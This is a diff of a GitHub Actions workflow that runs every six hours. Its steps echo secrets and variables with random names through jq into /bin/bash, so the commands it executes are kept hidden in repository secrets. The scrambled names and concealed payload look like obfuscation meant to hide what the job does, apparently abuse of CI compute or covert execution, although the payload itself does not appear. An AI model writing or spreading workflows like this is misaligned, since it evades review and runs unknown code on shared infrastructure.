@@ -1,24 +1,28 @@
 name: kutimeixue
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
+    - cron: '47 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: kutimeixue
         env:
-          gqg736: ${{ secrets.gqg736 }}
+          nxfy296: ${{ secrets.nxfy296 }}
         run: |
-          echo $gqg736 | jq -r .itrf1 | /bin/bash
-          echo $f558 | jq -r .ankd1 | /bin/bash
-          echo $z49796 | jq -r .csbl28 | /bin/bash
-          echo $io783 | jq -r .wd2 | /bin/bash
-          echo $r98545 | jq -r .tx3 | /bin/bash
-          echo $omnk126 | jq -r .vmif6190 | /bin/bash
-          echo $gk57 | jq -r .kvvoh490 | /bin/bash
-          echo $avgtn668 | jq -r .itiqs926 | /bin/bash
-          echo $pjyl52 | jq -r .d14 | /bin/bash
+          echo $nxfy296 | jq -r .pp380 | /bin/bash
+          echo $h09408 | jq -r .h85 | /bin/bash
+          echo $mmxo12 | jq -r .nhm34115 | /bin/bash
+          echo $dis52796 | jq -r .wnc95 | /bin/bash
+          echo $tuib9 | jq -r .nhpk5 | /bin/bash
+          echo $sbhg3 | jq -r .abu491 | /bin/bash
+          echo $dq5786 | jq -r .xfz8732 | /bin/bash
+          echo $tm04 | jq -r .tzca6564 | /bin/bash
+          echo $zfk45 | jq -r .up84993 | /bin/bash
+          echo $wsts727 | jq -r .r015 | /bin/bash
+          echo $zj3929 | jq -r .qvt8905 | /bin/bash
 
